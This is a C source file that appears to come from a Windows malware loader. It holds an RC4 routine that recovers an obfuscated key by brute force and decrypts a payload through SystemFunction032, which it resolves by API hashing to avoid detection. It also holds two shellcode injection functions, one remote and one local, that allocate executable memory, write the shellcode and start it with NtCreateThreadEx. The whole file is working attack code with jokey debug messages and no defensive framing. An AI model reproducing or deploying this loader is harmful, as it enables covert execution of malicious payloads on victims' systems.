#include <Windows.h>
#include <stdio.h>

#include "Structs.h"
#include "Common.h"
#include "Debug.h"

API_HASHING		 g_Api = { 0 };



BOOL Rc4EncryptionViSystemFunc032(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize) {

    // The return of SystemFunction032
    NTSTATUS        	STATUS = NULL;
    BYTE			RealKey[KEY_SIZE] = { 0 };
    int			    b = 0;

    // Brute forcing the key:
    while (1) {
        // Using the hint byte, if this is equal, then we found the 'b' value needed to decrypt the key 
        if (((pRc4Key[0] ^ b) - 0) == HINT_BYTE)
            break;
        // Else, increment 'b' and try again
        else
            b++;
    }

#ifdef DEBUG
    PRINTA("[i] Calculated 'b' to be : 0x%0.2X \n", b);
#endif

    // Decrypting the key
    for (int i = 0; i < KEY_SIZE; i++) {
        RealKey[i] = (BYTE)((pRc4Key[i] ^ b) - i);
    }

    // Making 2 USTRING variables, 1 passed as key and one passed as the block of data to encrypt/decrypt
    USTRING         Key = { .Buffer = RealKey,              .Length = dwRc4KeySize,         .MaximumLength = dwRc4KeySize },
        Img = { .Buffer = pPayloadData,         .Length = sPayloadSize,         .MaximumLength = sPayloadSize };


    // Since SystemFunction032 is exported from Advapi32.dll, we load it Advapi32 into the prcess,
    // And using its return as the hModule parameter in GetProcAddress
    fnSystemFunction032 SystemFunction032 = (fnSystemFunction032)GetProcAddressH(LoadLibraryA("Cryptsp"), SystemFunction032_DJB2);

    // If SystemFunction032 calls failed it will return non zero value
    if ((STATUS = SystemFunction032(&Img, &Key)) != 0x0) {
#ifdef DEBUG
        PRINTA("[!] SystemFunction032 FAILED With Error : 0x%0.8X\n", STATUS);
#endif
        return FALSE;
    }

    return TRUE;
}




BOOL injectMyAss(IN HANDLE hProcess, IN DWORD PID, IN PBYTE pShellcode, IN SIZE_T sShellcodeSize) {

    PVOID   pRemoteAddress = NULL;


    NTSTATUS    STATUS = 0;
    HANDLE      hThread = NULL;
    SIZE_T      sBytesWritten = 0;



    CLIENT_ID CID = { (HANDLE)PID, 0 };
    OBJECT_ATTRIBUTES OA = { sizeof(OA), 0 };




#ifdef DEBUG
    PRINTA("allocating buffer in process memory...\n");
#endif
    STATUS = NtAllocateVirtualMemory(hProcess, &pRemoteAddress, 0, &sShellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!STATUS == STATUS_SUCCESS) {
#ifdef DEBUG
        PRINTA("[NtAllocateVirtualMemory] failed to allocate memory, error: 0x%x\n", STATUS);
#endif 
        goto CLEANUP;
    }
#ifdef DEBUG
    PRINTA("allocated buffer with PAGE_EXECUTE_READWRITE [RWX] permissions! At : 0x%p\n", pRemoteAddress);
#endif


#ifdef DEBUG
    PRINTA("writing payload to allocated buffer...\n");
#endif
    STATUS = NtWriteVirtualMemory(hProcess, pRemoteAddress, pShellcode, sShellcodeSize, &sBytesWritten);
    if (!STATUS == STATUS_SUCCESS) {
#ifdef DEBUG
        PRINTA("[NtWriteVirtualMemory] failed to write to allocated buffer, error: 0x%x\n", STATUS);
#endif
        goto CLEANUP;
    }
#ifdef DEBUG
    PRINTA("wrote %zu-bytes to allocated buffer!\n", sBytesWritten);
#endif


#ifdef DEBUG
    PRINTA("creating thread, beginning execution\n");
#endif
    STATUS = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, pRemoteAddress, NULL, FALSE, 0, 0, 0, NULL);
    if (!STATUS == STATUS_SUCCESS) {
#ifdef DEBUG
        PRINTA("[NtCreateThreadEx] failed to create thread, error: 0x%x\n", STATUS);
#endif
        goto CLEANUP;
    }
#ifdef DEBUG
    PRINTA("thread created!\n");
#endif  

#ifdef DEBUG
    PRINTA("waiting for thread to finish executing...\n");
#endif
    STATUS = NtWaitForSingleObject(hThread, FALSE, NULL);
    if (!STATUS == STATUS_SUCCESS) {
#ifdef DEBUG
        PRINTA("[NtWaitForSingleObject] failed to wait for thread to finsih, error: 0x%x\n", STATUS);
#endif
        goto CLEANUP;
    }
#ifdef DEBUG
    PRINTA("thread execute succesfully!\n");
#endif

    goto CLEANUP;


CLEANUP:
#ifdef DEBUG
    PRINTA("clean up, closing thread handle...\n");
#endif
    STATUS = NtClose(hThread);
    if (!STATUS == STATUS_SUCCESS) {
#ifdef DEBUG
        PRINTA("[NtClose] Unable to close thread handle, error: 0x%x\n", STATUS);
#endif
        return EXIT_FAILURE;
    }
#ifdef DEBUG
    PRINTA("thread handle closed!\n");
#endif

#ifdef DEBUG
    PRINTA("cleanup complete! have fun!\n");
#endif
    return TRUE;
}



BOOL LocalInjection(IN HANDLE hProcess, IN PBYTE pShellcode, IN SIZE_T sShellcodeSize) {

    PVOID pAddress = NULL;
    NTSTATUS STATUS = 0;
    HANDLE hThread = NULL;
    ULONG uOldProtection = NULL;

    SIZE_T sSize = sShellcodeSize,
        sNumberOfBytesWritten = NULL;

    SIZE_T      sBytesWritten = 0;




    STATUS = NtAllocateVirtualMemory(hProcess, &pAddress, 0, &sShellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!STATUS == STATUS_SUCCESS) {
#ifdef DEBUG
        PRINTA("[NtAllocateVirtualMemory] failed to allocate mem... Error: 0x%x\n", STATUS);
#endif
        return FALSE;
    }
#ifdef DEBUG
    PRINTA("Allocated memory at: 0x%p\n", pAddress);
#endif


    // writing payload
    STATUS = NtWriteVirtualMemory(hProcess, pAddress, pShellcode, sShellcodeSize, &sNumberOfBytesWritten);
    if (!STATUS == STATUS_SUCCESS) {
#ifdef DEBUG
        PRINTA("[NtWriteVirtualMemory] [L] failed, error: 0x%0.8X\n", STATUS);
#endif
        return FALSE;
    }
#ifdef DEBUG
    PRINTA("\t[+] Payload written to 0x%p\n", pAddress);
#endif

    // Changing mem permissions
    STATUS = NtProtectVirtualMemory(hProcess, &pAddress, &sShellcodeSize, PAGE_EXECUTE_READWRITE, &uOldProtection);
    if (!STATUS == STATUS_SUCCESS) {
#ifdef DEBUG
        PRINTA("[NtProtectVirtualMemory] failed, error: 0x%0.8X\n", STATUS);
#endif
        return FALSE;
    }



#ifdef DEBUG
    PRINTA("Creating local thread to execute shellcode... ");
#endif
    STATUS = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, pAddress, NULL, FALSE, 0, 0, 0, NULL);
    if (!STATUS == STATUS_SUCCESS) {
#ifdef DEBUG
        PRINTA("[NtCreateThreadEx] failed to create thread, error: 0x%x\n", STATUS);
#endif
        goto CLEANUP;
    }
#ifdef DEBUG
    PRINTA("Created Thread successfully!\n");
#endif



#ifdef DEBUG
    PRINTA("Waiting for thread to finish... ");
#endif
    STATUS = NtWaitForSingleObject(hThread, FALSE, NULL);
    if (!STATUS == STATUS_SUCCESS) {
#ifdef DEBUG
        PRINTA("[NtWaitForSingleObject] could not wait for thread to finish... Error: 0x%x\n", STATUS);
#endif 
        goto CLEANUP;
    }
#ifdef DEBUG
    PRINTA("[+] Thread Finished Execution!!\n\n");
#endif





CLEANUP:
#ifdef DEBUG
    PRINTA("clean up, closing thread handle...\n");
#endif
    STATUS = NtClose(hThread);
    if (!STATUS == STATUS_SUCCESS) {
#ifdef DEBUG
        PRINTA("[NtClose] Unable to close thread handle, error: 0x%x\n", STATUS);
#endif
        return EXIT_FAILURE;
    }
#ifdef DEBUG
    PRINTA("thread handle closed!\n");
#endif

#ifdef DEBUG
    PRINTA("cleanup complete! Bully time!\n");
#endif
    return TRUE;
}